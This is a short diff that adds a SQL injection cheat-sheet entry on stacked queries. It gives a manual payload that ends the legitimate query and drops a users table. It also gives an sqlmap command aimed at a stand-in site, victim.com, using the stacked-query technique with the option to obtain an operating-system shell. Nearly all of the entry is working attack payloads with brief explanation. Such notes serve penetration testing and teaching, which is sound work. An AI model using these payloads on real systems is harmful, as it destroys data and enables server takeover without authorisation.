@@ -1,0 +1,18 @@
+Stacked Queries (when multiple statements are allowed)
+
+Idea: Execute more than one query at once.
+
+Manual Payload Example (MySQL/Postgres):
+
+'; DROP TABLE users;--
+
+
+First ends the legit query, second deletes the table.
+(Dangerous, usually filtered in modern apps.)
+
+sqlmap Command:
+
+sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=S --os-shell
+
+
+👉 Can sometimes get an OS shell if DB has permissions.
